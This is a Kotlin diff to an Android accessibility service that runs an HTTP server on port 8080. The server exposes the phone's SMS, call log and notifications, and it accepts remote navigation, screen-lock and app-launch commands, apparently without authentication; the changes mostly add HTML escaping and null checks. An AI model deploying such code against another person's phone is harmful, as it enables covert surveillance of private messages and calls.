@@ -4,12 +4,22 @@ import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
+import android.os.Build
 import android.provider.CallLog
+import android.text.TextUtils
 import android.view.accessibility.AccessibilityEvent
 import fi.iki.elonen.NanoHTTPD
 import java.text.SimpleDateFormat
+import java.util.Collections
 import java.util.Date
 import java.util.Locale
+
+data class NotificationModel(
+    val title: String,
+    val app: String,
+    val time: String,
+    val text: String
+)
 
 class RemoteControlService : AccessibilityService() {
 
@@ -17,6 +27,8 @@ class RemoteControlService : AccessibilityService() {
 
     companion object {
         var instance: RemoteControlService? = null
+        val capturedNotifications: MutableList<NotificationModel> =
+            Collections.synchronizedList(mutableListOf())
     }
 
     override fun onServiceConnected() {
@@ -25,7 +37,7 @@ class RemoteControlService : AccessibilityService() {
         try {
             if (server == null) {
                 server = WebServer(8080)
-                server?.start()
+                server?.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
             }
         } catch (e: Exception) {
             e.printStackTrace()
@@ -35,11 +47,17 @@ class RemoteControlService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         server?.stop()
+        server = null
         instance = null
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
+
     override fun onInterrupt() {}
+
+    private fun escapeHtml(input: String?): String {
+        return TextUtils.htmlEncode(input ?: "")
+    }
 
     private fun getSmsHtml(): String {
         val sb = StringBuilder()
@@ -55,16 +73,23 @@ class RemoteControlService : AccessibilityService() {
                 val addrIdx = it.getColumnIndex("address")
                 val bodyIdx = it.getColumnIndex("body")
                 val dateIdx = it.getColumnIndex("date")
+
                 while (it.moveToNext()) {
-                    val address = it.getString(addrIdx) ?: "Unknown"
-                    val body = it.getString(bodyIdx) ?: ""
-                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
-                    sb.append("<div class='card'><b>From: ").append(address).append("</b><small style='float:right'>")
-                      .append(date).append("</small><p>").append(body).append("</p></div>")
+                    val rawAddress = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
+                    val rawBody = if (bodyIdx != -1) it.getString(bodyIdx) else ""
+                    val rawDate = if (dateIdx != -1) it.getLong(dateIdx) else 0L
+
+                    val address = escapeHtml(rawAddress)
+                    val body = escapeHtml(rawBody)
+                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(rawDate))
+
+                    sb.append("<div class='card'><b>From: ").append(address).append("</b>")
+                        .append("<small style='float:right'>").append(date).append("</small>")
+                        .append("<p>").append(body).append("</p></div>")
                 }
             }
         } catch (e: Exception) {
-            return "<div class='card'><p>Error reading SMS: ${e.message}</p></div>"
+            return "<div class='card'><p>Error reading SMS: ${escapeHtml(e.message)}</p></div>"
         }
         return if (sb.isEmpty()) "<div class='card'><p>No SMS found in inbox.</p></div>" else sb.toString()
     }
@@ -74,10 +99,16 @@ class RemoteControlService : AccessibilityService() {
         try {
             val cursor = contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
-                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
+                arrayOf(
+                    CallLog.Calls.NUMBER,
+                    CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE,
+                    CallLog.Calls.DATE,
+                    CallLog.Calls.DURATION
+                ),
                 null,
                 null,
-                CallLog.Calls.DATE + " DESC LIMIT 40"
+                "${CallLog.Calls.DATE} DESC LIMIT 40"
             )
             cursor?.use {
                 val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
@@ -85,38 +116,46 @@ class RemoteControlService : AccessibilityService() {
                 val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                 val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                 val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
+
                 while (it.moveToNext()) {
-                    val number = it.getString(numIdx) ?: "Unknown"
-                    val name = it.getString(nameIdx) ?: number
-                    val type = when (it.getInt(typeIdx)) {
+                    val rawNumber = if (numIdx != -1) it.getString(numIdx) ?: "Unknown" else "Unknown"
+                    val rawName = if (nameIdx != -1) it.getString(nameIdx) ?: rawNumber else rawNumber
+                    val rawType = if (typeIdx != -1) it.getInt(typeIdx) else -1
+                    val rawDate = if (dateIdx != -1) it.getLong(dateIdx) else 0L
+                    val rawDuration = if (durIdx != -1) it.getString(durIdx) ?: "0" else "0"
+
+                    val typeStr = when (rawType) {
                         CallLog.Calls.INCOMING_TYPE -> "Incoming"
                         CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                         CallLog.Calls.MISSED_TYPE -> "Missed"
                         else -> "Call"
                     }
-                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
-                    val duration = it.getString(durIdx) ?: "0"
-                    sb.append("<div class='card'><b>").append(name).append(" (").append(type).append(")</b>")
-                      .append("<small style='float:right'>").append(date).append("</small><p>")
-                      .append(number).append(" | Duration: ").append(duration).append("s</p></div>")
+
+                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(rawDate))
+                    val name = escapeHtml(rawName)
+                    val number = escapeHtml(rawNumber)
+
+                    sb.append("<div class='card'><b>").append(name).append(" (").append(typeStr).append(")</b>")
+                        .append("<small style='float:right'>").append(date).append("</small><p>")
+                        .append(number).append(" | Duration: ").append(rawDuration).append("s</p></div>")
                 }
             }
         } catch (e: Exception) {
-            return "<div class='card'><p>Error reading call logs: ${e.message}</p></div>"
+            return "<div class='card'><p>Error reading call logs: ${escapeHtml(e.message)}</p></div>"
         }
         return if (sb.isEmpty()) "<div class='card'><p>No call logs found.</p></div>" else sb.toString()
     }
 
     private fun getNotificationsHtml(): String {
         val sb = StringBuilder()
-        synchronized(AppNotificationListener.notifications) {
-            for (item in AppNotificationListener.notifications.reversed()) {
-                sb.append("<div class='card'><b>").append(item.title)
-                  .append("</b> <small>(").append(item.app).append(" - ").append(item.time)
-                  .append(")</small><p>").append(item.text).append("</p></div>")
+        synchronized(capturedNotifications) {
+            for (item in capturedNotifications.reversed()) {
+                sb.append("<div class='card'><b>").append(escapeHtml(item.title))
+                    .append("</b> <small>(").append(escapeHtml(item.app)).append(" - ").append(escapeHtml(item.time))
+                    .append(")</small><p>").append(escapeHtml(item.text)).append("</p></div>")
             }
         }
-        return if (sb.isEmpty()) "<div class='card'><p>No notifications captured yet. Send a test message to Phone B.</p></div>" else sb.toString()
+        return if (sb.isEmpty()) "<div class='card'><p>No notifications captured yet.</p></div>" else sb.toString()
     }
 
     inner class WebServer(port: Int) : NanoHTTPD(port) {
@@ -131,7 +170,11 @@ class RemoteControlService : AccessibilityService() {
                     "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                     "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                     "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
-                    "lock" -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+                    "lock" -> {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+                        }
+                    }
                 }
                 return newFixedLengthResponse("OK")
             }
@@ -143,11 +186,12 @@ class RemoteControlService : AccessibilityService() {
                     val intent = packageManager.getLaunchIntentForPackage(pkg)?.apply {
                         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     }
-                    if (intent != null) {
+                    return if (intent != null) {
                         startActivity(intent)
-                        return newFixedLengthResponse("Launched $pkg")
+                        newFixedLengthResponse("Launched $pkg")
+                    } else {
+                        newFixedLengthResponse("Failed: Launch intent null")
                     }
-                    return newFixedLengthResponse("Failed: Launch intent null")
                 }
             }
 
@@ -164,14 +208,14 @@ class RemoteControlService : AccessibilityService() {
 
             val appsHtml = StringBuilder()
             for (app in packages) {
-                val name = app.loadLabel(pm).toString()
-                val pkg = app.packageName
+                val name = escapeHtml(app.loadLabel(pm).toString())
+                val pkg = escapeHtml(app.packageName)
                 appsHtml.append("<li><span><b>").append(name).append("</b><br><small>").append(pkg)
-                        .append("</small></span><button onclick=\"launchApp('").append(pkg)
-                        .append("')\">Open</button></li>")
+                    .append("</small></span><button onclick=\"launchApp('").append(pkg)
+                    .append("')\">Open</button></li>")
             }
 
-            // 5. Dashboard Page
+            // 5. Dashboard HTML Page
             val html = """
                 <!DOCTYPE html>
                 <html>
